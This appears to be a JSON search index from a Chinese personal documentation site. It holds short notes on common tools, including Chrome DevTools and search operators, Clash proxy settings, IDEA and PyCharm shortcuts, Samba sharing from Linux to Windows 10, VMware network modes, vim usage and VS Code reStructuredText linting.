Ctrl/Cmd + F 在当前页面搜索 侧边还有样式显示, 计算显示 Console 控制台, 在此界面 可 Ctrl/Cmd + Shift + F 全局搜索字符串; Ctrl/Cmd + O 或者 Ctrl/Cmd + P ，可以呼出一个文件列表窗口，\n输入关键词，可以搜索到 文件名包含这个词的文件 Network 网络连接 一些快捷键 Ctrl/Cmd + Shift + P 打开一个运行命令的窗口; 可直接上下键选择打开哪一个标签页 Esc 显示/隐藏当前标签页抽屉栏,\n只在控制台跟源代码标签页用过. 也可直接单击设置选择:","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-developer-tool.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-developer-tool.html"},{"title":"Chrome搜索技巧","text":"site 指定搜索时(不)查询某个域名(比如csdn): 今日大瓜 -site:csdn.net 说明: 无空格是不搜索指定域名 -site:csdn.net 有空格是仅搜索指定域名 -site: csdn.net 无 - 时, 不管有无空格, 都是仅搜索指定域名 site: csdn.net , site:csdn.net intitle 网页 标题 必须包含的内容: intitle:今日大瓜 intext 网页 内容 (正文)必须包含的内容: intext:今日大瓜 inurl 地址必包含的url, 如: inurl:index.php?id= filetype 文件类型: filetype:pdf","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-search.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-search.html"},{"title":"Chrome","text":"Chrome搜索 Chrome开发者工具","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Chrome-index.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Chrome-index.html"},{"title":"mac下chrome快捷键","text":"Mac 下 Chrome 浏览器 快捷键","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Chrome-shortcut-key-under-mac.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Chrome-shortcut-key-under-mac.html"},{"title":"clash等代理问题","text":"关于普通版clash的代理问题 规则: 你购买的节点代理商那边有一个分流规则,\n一般是国内的网站不走代理, 国外的网站走代理 全局: 全部都走代理 注解 这里的全局代理的意思并不是你设备上的所有软件都可以使用这个代理,\n而是指你 通过代理访问的所有网站都不进行分流 如果想要设备上其他软件走代理, 要看此软件是否支持了,\n有的可以手动在相应的软件内配置代理, 配置自动识别手动指定等. 比如需要用到yarn下载包, 命令行配置下本地clash代理地址即可: yarn config set proxy http://127.0.0.1:7890 对于不支持的, 那就只有不用或者用 Proxifier 强制指定了(付费软件, 暂未用过)","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Clash-Clash-and-other-agency-issues.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Clash-Clash-and-other-agency-issues.html"},{"title":"clash各版本备份","text":"源于别的UP. 视频说明: https://www.youtube.com/watch?app=desktop&v=e3QVBWDJREM 文章地址: https://duangks.com/archives/152/ 备份地址1-谷歌云: https://drive.google.com/drive/folders/1dmyLaj4L4x2Nz-P5n-rozcgCa9Ip4qJ_ 备份地址2-alist云盘: https://alist.duangks.com","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Clash-Clash-record.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Clash-Clash-record.html"},{"title":"设置应用全局","text":"我们通常所说的全局模式, 指的是 使用浏览器访问某个地址时,\n使用代理地址访问 . 而 规则模式 是, 仅对匹配名单的地址使用代理. 而系统的其他App能否正常访问代理, 得看应用自己有没有提供\n自动识别代理的功能. 对于MacOS, 直接使用 ClashX Pro 即可, 打开 使用增强模式 功能\n即可对全局App使用代理 下面主要介绍Windows. 安装虚拟网卡服务 打开Clash主界面, 安装服务模式, 安装服务模块 安装好后图中圈出位置会显示: 当前状态: 已激活 打开TUN模式 在 系统代理 打开的情况下,\n打开 TUN模式 成功后还可以看到有这个","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Clash-Set-the-overall-application.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Clash-Set-the-overall-application.html"},{"title":"Clash","text":"clash等代理问题 mac_clashx共享代理 设置应用全局 clash记录","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Clash-index.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Clash-index.html"},{"title":"mac下clash x共享代理","text":"在已安装clash x 且能够开启代理的机器上, 菜单栏点开clash x, 设置允许局域网连接 允许局域网连接 在另一个需要连接的设备设置http代理, ip为安装clash x机器的ip 端口为 7890 (mac默认是这个, win貌似可以自己设置)","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Clash-mac_clashx-sharing-agent.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Clash-mac_clashx-sharing-agent.html"},{"title":"文件格式-toml","text":"一般都是这么写的: [data1]\nkey1 = v1\nkey2 = v2 相当于定义了一个名为data1的字典. 那如果key1的值是字典呢?\n目前为止只知道一个可以 单行 字典定义: [data1]\nkey1 = {name='bob', age=20}\nkey2 = v2","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-File-format-TOML.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-File-format-TOML.html"},{"title":"idea快捷键","text":"mac与windows Idea 快捷键(与自家同系列其他产品大部分通用) Mac 作用 Windows Option + 方向上 选中当前光标所在字符串. 多次点击扩大范围 Ctrl + W Option + 方向下 与上一个相反. 可以在上面基础上缩小选择范围 Ctrl + Shift + W Option + 回车 显示上下文操作 Option + F7 查看所有声明或者调用(下方窗口) Option + Shift + 方向上 将当前行上移(调换位置) Option + Shift + 方向下 将当前行下移(调换位置) Control + 空格 显示补全建议. 选中后使用 tab 键可以完美替换后面的字符串 使用 return 是插入 Control + G 选择光标处字符串. 可多次点击选中下一个位置相同字符串. 可加 Shift 键. 取消多次选择的内容 Control + T 预览光标位置或选中区域的可重构选项 Control + Command + G 选中当前文件中所有与当前光标所在字符串一样的字符串 Control + Shift + 空格 显示建议的补全(根据当前上下文) Shift + F6 重命名光标所在字符串 Command + D 复制当前行 Command + del 删除当前行. del就是键盘右上角那个删除的叉. 在window键盘上backspace位置 Command + / 单行注释 Command + - 英文减号位置. 缩起当前代码段 Command + = 等号位置. 展开当前代码段 Command + P 查看方法签名. 形参信息 Command + Y 查看文本光标处符号定义. 如方法定义 Command + F1 查看警告说明. 再次点击查看详细说明 Command + F 当前文件查找 Command + F12 主窗体查看当前文件结构 Command + 7 打开文件结构小窗口 Command + B 跳转到方法声明/查看所有用法 Command + U 查看当前方法的父类声明 Command + E 查看最近打开的文件 Command + 9 预览git提交时间线 Command + L 手动输入 跳转到行 Ctrl + G Command + Option + / 多行注释(python没有. java才有) Command + Option + T 使用模版来环绕所选代码段. 比如if. try语句 Command + Option + V 替换局部变量. 需要先选中 Command + Option + L 格式化代码. 若有选中格式化选中代码. 若无选中则格式化全文代码. 加 Shift 可以自定义格式化选项 Command + Option + B 查看所有实现 Command + Shift + 回车 补全当前行所在语句 Command + Shift + 方向上 将当前方法与上一个方法调换. 注意光标需要在方法标头处 Command + Shift + 方向下 将当前方法与下一个方法调换. 注意光标需要在方法标头处 Command + Shift + - 英文减号位置. 缩起当前文件所有代码段 Command + Shift + = 等号位置. 展开当前文件所有代码段 Command + Shift + M 将所选代码块提取到方法 Command + Shift + F7 高亮显示所选文本的所有用法 Command + Shift + F 所有文件中查找 Command + Shift + H 查看方法的层次结构. 比如继承的树形图 Command + Shift + E 查看最近打开的文件中的修改 ESC 关闭主窗口区域的弹出窗口 Shift + ESC 关闭非主窗口弹出窗口 F1 查看文本光标处符号文档 F2 转到文件中下一个现实高亮的错误","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-IDEA-shortcut-key.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-IDEA-shortcut-key.html"},{"title":"StarWindConverter","text":"将 img 镜像转换为 Wmvare 可用的虚拟机文件 官网下载地址: https://www.starwindsoftware.com/starwind-v2v-converter#download 需要填写信息, 然后会给你发邮件, 下载地址在邮件里面, 我的是: https://www.starwindsoftware.com/tmplink/starwindconverter.exe 不知道是不是每人都一样 安装好之后使用, 选择需要转换的镜像 选择转换的目标 这里好像任意都可, 我选的第一个 然后 转换 如果有这个报错, 说明路径有中文, 换个路径就行","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-StarWindConverter.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-StarWindConverter.html"},{"title":"终端工具","text":"这里不得不提一下: 终端 tty console区别","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Terminal-tool.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Terminal-tool.html"},{"title":"使用samba实现win10映射磁盘驱动访问linux","text":"安装 安装samba: sudo apt install samba 这里可能会提示获取dhcp的配置信息，以及安装dhcp-client客户端，确认就好 配置 samba的配置文件一般在: /etc/samba/smb.conf 简单配置smb.conf: sudo vim /etc/samba/smb.conf 最后添加配置信息, 如: [user]     #共享名称database\n    comment = \"comment\"     # 描述信息\n    path = /tmp/user1       # 共享目录\n    public = no             # 关闭所有人可见\n    writable = yes          # 是否有写权限 自己机器的配置: [luyi]\n    comment = \"luyi\"\n    path = /home/luyi\n    writable = yes 添加用户 添加用户并设置密码: pdbedit -a luyi 最后打开win10的计算机映射网络驱动器 警告 使用 pdbedit 新建的用户名, 必须是当前系统已存在的用户名. over 注解 lz使用的是debian10，samba版本为4.9.5-debian，samba服务名为smbd.\n所以启动之类的需要 service smdb start，之前用samba tab出来的一直报错找了半天原因...... 虚拟机要保证跟宿主机之间可以相互ping通 win10宿主机建议开启以下配置：\n我的电脑右键 --> 管理 --> 服务和应用程序 --> 服务, 找到TCP/IP NetBIOS Helper，将启动类型修改为自动并且启动它 安装虚拟机，还是使用workstation吧，vitrualbox一直有问题，后续版本还跟win10不兼容 Win10连接: 可以直接在 WIN + R 里输入地址 也可以直接在文件资源管理器加上共享的详细路径添加网络位置 资料了解 Samba是一个能让Linux系统应用Microsoft网络通讯协议的软件，\n而SMB是Server Message Block的缩写，即为服务器消息块 ，\nSMB主要是作为Microsoft的网络通讯协议，后来Samba将SMB通信协议应用到了Linux系统上，\n就形成了现在的Samba软件。后来微软又把 SMB 改名为 CIFS（Common Internet File System），\n即公共 Internet 文件系统，并且加入了许多新的功能，这样一来，使得Samba具有了更强大的功能。 主要配置介绍 配置文件的大概组成global、homes、printers global global定义全局的配置: [global]\n    workgroup = MYGROUP                                                     # 工作组，按win下的理解即可\n                                                # win默认为WORKGROUP\n    server string = Samba Server Version %v\n    security = user                                                         # security默认(user)用户级别，\n                                                # 详见下关于security级别\n    passdb backend = tdbsam                                         # passdb backend （用户后台），\n                                                # samba有三种用户后台：\n                                                # smbpasswd, tdbsam和ldapsam\n                                                # 详见下关于samba三种用户后台\n    load printers = yes                                                     # 设置打印机相关\n    cups options = raw                                                      # 设置打印机相关\n    masks = 0700                                # 设置文件掩码, 如700表示新建文件的权限, global其他的参数: netbios name = MYSERVER                     # 设置出现在\"网上邻居\"中的主机名\nhosts allow = 127. 192.168.12. 192.168.13.  # 用来设置允许的主机，如果在前面加\";\"则表示允许所有主机\nlog file = /var/log/samba/%m.log            # 定义samba的日志，这里的%m是上面的netbios name\nmax log size = 50                           # 指定日志的最大容量，单位是K homes homes是共享用户自己的家目录, 针对共享目录个别的设置，只对当前的共享资源起作用,\n也就是说，当用户登录到samba服务器上时实际上是进入到了该用户的家目录，\n用户登陆后，共享名不是homes而是用户自己的标识符，对于单纯的文件共享的环境来说，这部分可以注视掉: [homes]\n    comment = Home Directories\n    browseable = no\n    writable = yes\n    mask = 0700                         # 设置文件掩码, 如700表示新建文件的权限, 警告 再次申明, 此处的 homes 表示用户名, 比如我系统有一个 luyi 用户, 那么\n使用 pdbedit命令 创建的用户也需要是 luyi pdbedit -a luyi 这里的 homes 的值也为 luyi [luyi]\n    comment = \"luyi\"\n    path = /home/luyi\n    writable = yes\n    ... 表示针对 luyi 这一个用户做更详细的配置. printers printers设置该部分内容设置打印机共享: [printers]\n    comment = All Printers\n    path = /var/spool/samba\n    browseable = no\n    guest ok = no\n    writable = no\n    printable = yes 关于security级别 安全级别解析： share模式：不用进行权限匹配检查即可访问共享资源，安全性比较差； user模式：需要对用户名和密码进行验证，通过后才能访问共享资源，具有一定的安全性； server模式：通过指定的服务器对用户名和密码进行验证，如果不通过，客户端会用user级别访问； domain模式：domain级别的Samba服务器只作为域的成员客户端加入Windows域中，由Windows域控制器来完成对用户名和密码的验证； ads模式：如果Samba服务器以ads方式加入Windows域中，将具备domian级别的所有功能，并且可以完成对用户名和密码的验证工作。 关于samba三种用户后台 smbpasswd 该方式是使用smb工具smbpasswd给系统用户（真实用户或者虚拟用户）设置一个Samba 密码，\n客户端就用此密码访问Samba资源。smbpasswd在/etc/samba中，有时需要手工创建该文件: -a: 添加\n-x: 删除\n-d: 禁用\n-e: 启用\n-L: 列出相关信息\n-v: 与L搭配使用，列出更多信息\n-w: 搭配L，使用旧版格式\n-r: 修改一个账户的相关信息\n-m: 后接机器代码(machine account)，与 domain model 有关！ tdbsam 使用数据库文件创建用户数据库。\n数据库文件叫passdb.tdb，在/etc/samba中。\npassdb.tdb用户数据库可使用smbpasswd –a创建Samba用户，要创建的Samba用户必须先是系统用户。\n也可使用pdbedit创建Samba账户。pdbedit参数很多，列出几个主要的: pdbedit –a username：新建Samba账户。\npdbedit –x username：删除Samba账户。\npdbedit –L：列出Samba用户列表，读取passdb.tdb数据库文件。\npdbedit –Lv：列出Samba用户列表详细信息。\npdbedit –c \"[D]\"–u username：暂停该Samba用户账号。\npdbedit –c \"[]\"–u username：恢复该Samba用户账号。 ldapsam 基于LDAP账户管理方式验证用户。首先要建立LDAP服务，\n设置: passdb backend = ldapsam:ldap://LDAP Server pdbedit命令 pdbedit 参数及功能：pdbedit命令是samba的用户管理命令 参数 作用 -a user 建立samba的用户user -r user 修改samba的用户user -x user 删除samba的用户user -L 列出用户列表 -Lv 列出用户详细信息的列表 -c \"[D]\" -u user 暂停该samba用户user -c \"[D]\" -u user 恢复该samba用户user 注解 使用pdbedit创建好用户后, 输出会提示链接的网络路径.","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Use-Samba-to-implement-the-win10-disk-drive-to-access-Linux.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Use-Samba-to-implement-the-win10-disk-drive-to-access-Linux.html"},{"title":"VMware 三种网络模式","text":"参考: https://www.cnblogs.com/pipci/p/12271190.html https://wenku.baidu.com/view/7d6f1a3f084e767f5acfa1c7aa00b52acfc79c1d 网卡、路由器、交换机 网卡 是电脑内置的硬件，一般的笔记本会有两个网卡: 以太网网卡，有线上网用 Wi-Fi网卡，无线上网使用。 Windows 网络适配器 路由器 一般有几个功能，第一个是网关，控制下行网络。第二个是扩展有线网络端口，比如家里有四个房间，每个房间都要有一个网口。第三个是WiFi功能，可以接入无线设备。 交换机 一般只有扩展有线网络端口一个功能，也就是说可以把局域网的电脑组建成一个网络。 如果只有交换机没有路由器是不能上网的。 最后：我们看下总体的网络结构图：交换机是用来扩展接口，或者把局域网的电脑连接到一个网络环境用的。路由器帮我们连接到互联网。 网络结构图 虚拟网络编辑器 首先，虚拟机有三个虚拟交换机，分别对应于三种模式。 三个虚拟机交换机 虚拟交换机种类 虚拟交换机 用途 VMnet0 桥接模式 VMnet1 仅主机模式 VMnet8 NAT模式 注意，名字短的是虚拟机交换机。 因为我们前面讲过了，交换机的作用是扩展接口或者组网，所以这些虚拟机交换机的作用就是让相同网络模式的虚拟机能够相互连接。 另外，安装Vmware软件的时候，它还在我们的物理机里面安装了两个虚拟网卡。 虚拟网卡 虚拟网卡 虚拟网卡名称 用途 VMware Network Adapter VMnet1 仅主机模式 VMware Network Adapter VMnet8 NAT模式 名字长的是虚拟网卡。 虚拟网卡，是物理机使用的，用来连接到虚拟交换机，和虚拟机连接。 为什么没有vVMware Network Adapter VMnet0呢？这个我们我们后面来解答。 注意，一个机器可以同时使用多种网络模式，也就是使用多个虚拟网卡。 使用多种网络模式 比如一台虚拟机，同时需要有内网IP和外网IP，就可以添加两个网络适配器。 对于这三种网络模式，我们最重要的是解决两个问题： 在不同的网络模式下： 1、主机怎么和虚拟机连接？\n2、虚拟机怎么连接到互联网？ 网络模式 桥接模式 桥接模式 通信方式 虚拟机通过连接到虚拟机交换机，利用虚拟网桥连接到主机的网卡。 它不需要用到虚拟网卡，所以没有VMware Network Adapter VMnet0。 特点 物理机和虚拟机地位平等 虚拟机占用一个独立IP 使用物理机的网卡访问互联网 配置 虚拟机IP网段和主机一致 连通情况 主机和虚拟机可以访问 虚拟机之间可以相互访问 可以访问互联网 使用场景 创建一个虚拟服务器在内网提供网络服务 NAT NAT 通信方式 虚拟NAT设备（虚拟路由）连接到VMnet8虚拟交换机——虚拟机联网用 主机通过VMware Network Adapter VMnet8虚拟网卡连接到VMnet8虚拟交换机——主机和虚拟机连接用 注解 虚拟DHCP服务器连接到VMnet8虚拟交换机 特点 虚拟机在外部网络中没有自己的IP地址 虚拟NAT设备会把专用网络中的 IP 地址转换为主机系统的 IP 地址——网络地址转换 主机可以联网，虚拟机就可以联网 配置 无 连通情况 主机和虚拟机可以访问 虚拟机之间可以相互访问 可以访问互联网 本机虚拟机可以访问其他主机 其他主机不能访问本机虚拟机。解决办法：共享网络、端口映射 使用场景 大部分情况 仅主机 仅主机 通信方式 主机使用VMware Network Adapter VMnet1虚拟网卡连接到VMnet1虚拟交换机 特点 没有了虚拟NAT设备，所以不能上网 连通情况 主机和虚拟机可以访问 虚拟机之间可以相互访问 不能访问互联网，解决办法：主机网卡共享给VMware Network Adapter VMnet1网卡 不能访问其他主机 其他主机不能访问本机虚拟机 使用场景 创建一个与其他机器隔离的网络 总结 在网络模式的区别里面，只需要记住1、特点2、使用场景就可以了。不需要记住上网到底是怎么实现的。 结论 桥接需要一个额外的IP NAT模式是最简单的 仅主机用于封闭网络 注解 原文地址: https://cloud.fynote.com/share/d/12926 访问码: 6379","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-VMware-three-network-modes.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-VMware-three-network-modes.html"},{"title":"WIN实用工具","text":"procexp (Process Explorer) 进程资源管理器, 比自带任务管理器更专业, 可替换;\n可显示有关打开或加载了哪些句柄和 DLL 进程的信息。 下载地址: learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Win-practical-tool.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Win-practical-tool.html"},{"title":"常用工具使用","text":"Wmvare三种网络模式 idea快捷键 pycharm vim vscode 使用samba实现win10映射磁盘驱动访问linux 终端工具 android_studio 文件格式-toml Chrome Clash WIN实用工具 VMware Workstation StarWindConverter mac下chrome快捷键 mac的包管理器brew mac下应用运行管理","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-index.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-index.html"},{"title":"配置pytest环境","text":"有时候点测试左边的三角形, 发现使用的是unittest, 于是就找了一下pytest相关的配置. 前提说明, 安装pytest及相应pytest插件, 必须安装的包: pip install pytest pytest-runner pytest.ini 这三个包貌似直接加*就行: pip install pytest* 然后看具体的测试用例使用了哪些插件, 然后去自己装. 比如定义了async异步测试函数, 需要使用asyncio标记: @pytest.mark.asyncio 这个时候就需要用到相应的插件: pip install pytest-asyncio 在Pycharm配置默认测试执行程序 默认是自动识别, 可以在以下位置查看/修改: 设置 =》 工具 =》 Python 继承工具 =》 测试 默认测试运行程序","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-Configure-the-pytest-environment.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-Configure-the-pytest-environment.html"},{"title":"全局查找快捷键失效","text":"主要是Windows下面, 使用 Ctrl+Shift+F 无法打开搜索窗口. 多半是输入法或者其他什么占用了此快捷键, 可以鼠标放到输入法然后右键打开设置. Win10系统输入法可能是简繁切换占用 搜狗输入法也是","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-Global-Find-the-problem-of-shortcut-keys.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-Global-Find-the-problem-of-shortcut-keys.html"},{"title":"Pycharm书签使用","text":"快捷键-Windows F11                   : 光标所有位置添加书签 Ctrl + 单击     : 在左侧行号旁使用, 添加书签 Shift + F1    : 查看所有书签 注解 添加书签后, 还可设置编号, 如当前位置设置 1 , 即可 Ctrl + 1 , 快捷跳转. 快捷键-Mac 待补充","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-Pycharm-bookmark-use.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-Pycharm-bookmark-use.html"},{"title":"Pycharm","text":"Pycharm书签使用 pycharm添加版权文件 pycharm设置同步问题 配置pytest环境 快捷键 全局查找快捷键失效问题","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-index.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-index.html"},{"title":"Pycharm添加版权文件","text":"设置概览 File > Settings > Editor > Copyright > Copyright Profiles 然后添加版权文件, 随便自己命名就行 版权配置文件 新建好后在版权李设置好生效范围即可 设置生效范围 最后应用, mac下新建好文件后 command + n 直接添加版权即可 注解 windows 貌似是 alt + insert , 然后选择copyright 一些相关配置变量 Pycharm配置文件可用变量 Name Type Comment $today DateInfo 当前日期时间对象 $file.fileName String 当前文件的名称 $file.pathName String 当前文件的完整路径 $file.className String 当前文件的类名 $file.qualifiedClassName String 当前文件的权限定名 $file.lastModified DateInfo 上一次修改的日期时间对象 $project.name String 当前项目名 $module.name String 当前 Module 名 $username String 当前用户名（系统用户名） 其中, DateInfo 对象有如下属性和方法： DateInfo 对象的属性和方法 Name Type Comment year int 当前年份 month int 当前月份 day int 当前日期（1-31） hour int 当前小时（0-11） hour24 int 当前小时（0-23） minute int 当前分钟（0-59） second int 当前秒数（0-59） format(String format) String 时间日期格式化方法, 参考:java.text.SimpleDateFormat format 注解 Pycharm网上很少有这种说明, 这些还是参考的 Idea 的相关说明配置.\n自定义变量的方式也没有找到, 后面找到了再补充. 另外, 也可以 直接添加模板 . 自己使用的配置 coding: utf-8\n\nCopyright (C) 2022-${today.year}, Inc. All Rights Reserved\n\n@Time    : ${today.format(\"yyyy-MM-dd\")}\n@Author  : yan que\n@Email   : yanquer@qq.com\n@File    : ${file.fileName}\n@Project : ${project.name} 直接添加模版的方式 直接添加模板 参考配置 # coding: utf-8\n#\n# Copyright (C) 2022-${YEAR}, Inc. All Rights Reserved\n#\n# @Time    : ${DATE} ${TIME}\n# @Author  : yan que\n# @Email   : yanquer@qq.com\n# @File    : ${NAME}\n# @Project : ${PROJECT_NAME} 注解 使用模版 与 使用版权配置文件, 任选其一即可, 都用可能会点问题(冲突会自动合并)","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-adds-copyright-files.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-adds-copyright-files.html"},{"title":"Pycharm 设置同步问题","text":"前言 将工具版本更新到 PyCharm2022.3 后, 在文件或右下角找不到同步设置的地方了, 一度以为是这个功能被砍了, 最后在设置里面找到了 设置里面新增了一个 设置同步 选项, 默认禁用, 打开即可.","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-setting-synchronization-problem.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-setting-synchronization-problem.html"},{"title":"快捷键","text":"快捷键 idea/pycharm command option v new一个对象的时候, 自动命名, 或者定义变量时快速命名 command option <-\n返回上一个位置 command option ->\n去下一个位置 command shift f\n全局搜索字符串 command shift r\n全局替换 command f\n文件内搜索字符串 command r\n文件内替换 shift shift\n全局搜索文件名 Win下: ctrl + alt + shift + l : 快速格式化 其他 vscode快捷键位置","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-shortcut-key.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-pycharm-shortcut-key.html"},{"title":"vim","text":"vim有四个模式 正常模式 (Normal-mode) 插入模式 (Insert-mode) 命令模式 (Command-mode) 可视模式 (Visual-mode) 简单使用: vim     file                #打开文件\n        file1 file2         #打开两个文件\n        -O2 file1 file2     #分屏打开两个文件。有几个O几\n        -o                  #大写O表示左右排版，小写o表示上下排版 常用快捷键 快捷键: shift + a (or A)    # 快速移动到行末尾, 并进入编辑模式\ndd                  # 删除当前行\ngg                  # 光标跳转到文件首行\nshift + g (or G)    # 光标跳转文件最后一行\n_                   # 光标移到当前行第一个非空字符位置\nv,V                 # 可视化模式\n行号+gg             # 快速移动到指定行号\ni                   # 当前位置插入\no                   # 当前行下一行插入\n\n:u              # 撤销\nctrl+r          # 恢复撤销 更多详见:: 精通 VIM ，此文就够了 编码格式 编码格式: :set fenc                   # 查看文本编码 fenc是fileencoding缩写\n                            # 与 :set fileencoding 一样\n:set fenc='filecode'        # 转换当前文本的编码为指定的编码\n:set enc='filecode'         # 以指定的编码显示文本，但不保存到文件中 encoding缩写\n                            # 这里的\"编码\"常见为gbk utf-8 big5 cp936\n                            # fileencoding---fenc\n                            #     encoding---enc\n\n:set invlist 显示换行符等字符\n:set nolist  关闭换行符等字符显示 模式 模式: :set ff?                    #查看模式类型，一般为dos,unix\n:set ff=dos                    #设置模式    例如设置unix模式    :set fileformat=unix\n                            #与:set fileformat=dos一个效果 ff是缩写\n                            #  fileformat---ff\n                            # :%s/&#94;M//g等同于:set ff=unix 移动编辑 移动编辑: gg               # 光标跳转到文件首行\nG                # 光标跳转文件最后一行\n_                # 光标移到当前行第一个非空字符位置\nA                # 移动到行尾\nv,V              # 可视化模式\n行号+gg            #快速移动到指定行号 粘贴与复制 粘贴与复制: y                # 复制当前光标所在处字符\nyy               # 复制当前光标所在行\np                # 在当前位置粘贴上一次复制的内容 删除 删除: dd                #命令模式下dd删除当前行\n\n# 删除多行，如删除8-17行 8,17d 查找 斜杠后跟查找的字符查找: :/'what' 替换 替换: # :{作用范围}s/{目标}/{替换}/{替换标志}\n\n# 会在全局范围(%)查找foo并替换为bar，所有出现都会被替换（g）。\n:%s/foo/bar/g\n\ns表示单行查找替换,\n%s表示全局查找替换 其他 其他: :w                 #保存不退出\n:w                 #新文件名 把文件另存为新文件\n:q                 #不保存退出\n:wq             #保存退出\n:!                 #强制\n:q!             #强制不保存退出，用于修改文件之后，不保存数据退出\n:wq!             #强制保存退出，当文件的所有者或 root 用户，对文件没有写权限的时候，强制写入数据使用\n\n:ls                #查看当前编辑器所有文件\n:bn                #切换到第n个文件  主要是b控制的 序号可以先ls查看 便捷配置 语法高亮: vim\nsyntax on                # 语法高亮\nfiletype indent on       # 开启文件类型检查，并且载入与该类型对应的缩进规则\n\nset showmode               # 底部显示当前模式， 如命令模式、插入模式\nset showcmd                # 命令模式下，底部显示当前键入的指令\nset mouse=a                # 支持使用鼠标\nset encoding=utf-8         # 使用 utf-8 编码\nset t_Co=256               # 启用256色 缩进: set autoindent             # 按下回车键时，下一行缩进与上一行保持一致\nset tabstop=2              # 按下tab时, vim显示的空格数\nset shiftwidth             # 在文本上按下>>（增加一级缩进）、<<（取消一级缩进）或者==（取消全部缩进）时，每一级的字符数。\nset expandtab              # 由于 Tab 键在不同的编辑器缩进不一致，该设置自动将 Tab 转为空格。\nset softtabstop=2          # Tab 转为多少个空格 外观: set number                  # set nu 也可，显示行号\nset relativenumber          # 显示光标所在的当前行的行号，其他行都为相对于该行的相对行号。\nset cursorline              # 光标所在当前行高亮\nset textwidth=80            # 设置行宽，即一行显示多少字符\nset wrap                    # 自动折行，即太长的行分为几行显示\nset nowrap                  # 关闭自动折行\nset linebreak               # 只有遇到指定的符号（比如空格、连词号和其他标点符号），才发生折行。也就是说，不会在单词内部折行。\nset wrapmargin=2            # 指定折行处与编辑窗口的右边缘之间空出的字符数。\nset scrolloff=5             # 垂直滚动时，光标距离顶部/底部的位置（单位：行）\nset sidescrolloff=15        # 水平滚动时，光标距离行首或行尾的位置（单位：字符）。该配置在不折行时比较有用。\nset laststatus=2            # 是否显示状态栏。0 表示不显示，1 表示只在多窗口时显示，2 表示显示。\nset ruler                   # 在状态栏显示光标的当前位置（位于哪一行哪一列）。 参考:: Vim 配置入门 - 阮一峰的网络日志 语法 变量 变量定义: let a=1 打印: echo &a 参考:: VIM 中文用户手册: 编写 Vim 脚本","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-vim.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-vim.html"},{"title":"记录vscode与rst协作遇到的一些坑","text":"语法检查 主要就是语法检查的坑 用到的拓展含 restructuredtext , 内置了 lint 语法检查, 包含三种类型 rst-check rst-lint doc8 提示 ... 插件商店有提示lint使用的是另一个插件, 我没细看, 有兴趣的自行了解吧 其中, 数 rst-lint 问题最大, vscode 在另外的地方已经有配置使用 sphinx 检查,\n这里拓展使用的 rst-lint 检查默认貌似是使用的 docutils , 导致没问题的地方, 老给你标波浪线, 严重影响体验. 例如: toctree标记语法错误, 其实没问题 最后配置以下设置解决 // 禁用 rst-lint \"restructuredtext.linter.disabledLinters\" : [ \"rst-lint\" , ], // 使用 sphinx 预览 \"restructuredtext.preview.name\" : \"sphinx\" , 参考文档 restructuredtext配置 restructuredtext-linter介绍 restructuredtext-issues#386 注解 当时还在 restructuredtext-issues#386 询问了作者, 后面才看到邮件被告知确实似乎 linter 的问题, 但不是他们开发的. 然后顺手关闭了此问题... 最开始的理解是 restructuredtext 里集成了 linter , 设想 linter 可以被 restructuredtext 自动设置, 是我错了, 